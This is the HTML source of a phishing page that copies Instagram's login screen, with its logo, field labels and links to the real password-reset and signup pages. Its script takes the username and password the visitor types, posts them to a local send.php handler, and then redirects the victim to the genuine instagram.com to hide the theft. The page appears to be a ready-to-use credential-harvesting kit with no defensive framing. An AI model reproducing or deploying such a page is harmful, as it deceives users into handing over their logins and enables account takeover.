<!DOCTYPE html>
<html lang="pt-br">
<head>
    <title>Instagram</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="60">
    <link rel="icon" href="images/favicon.png" type="image/icon">
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <div class="container">
        <div class="page">
            <div class="logo">
                <img src="images/instagram.png" alt="instagram" style="width: 175px;">
            </div>
            <br />
            <form id="contact-form" class="container">
                <input type="text" placeholder="Phone number, username, or email" name="u_name">
                <input type="password" placeholder="Password" name="pass">
                <button type="button" class="submitbutton" onclick="submitForm()">Log in</button>
                <br />
                <div class="option">OR </div>
            </form>
            <div class="fblink">
                <span class="fab fafacebook"></span>
                <a href="#"> Log in With Facebook</a>
            </div>
            <div class="forget-id">
                <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
            </div>
            <div class="singup">
                <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/"> Sign up</a></p>
            </div>
        </div>
    </div>

    <script>
        function submitForm() {
            var form = document.getElementById('contact-form');
            var formData = new FormData(form);

            fetch('send.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                alert(data);
                window.location.replace('https://www.instagram.com');
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            });
        }
    </script>
</body>
</html>
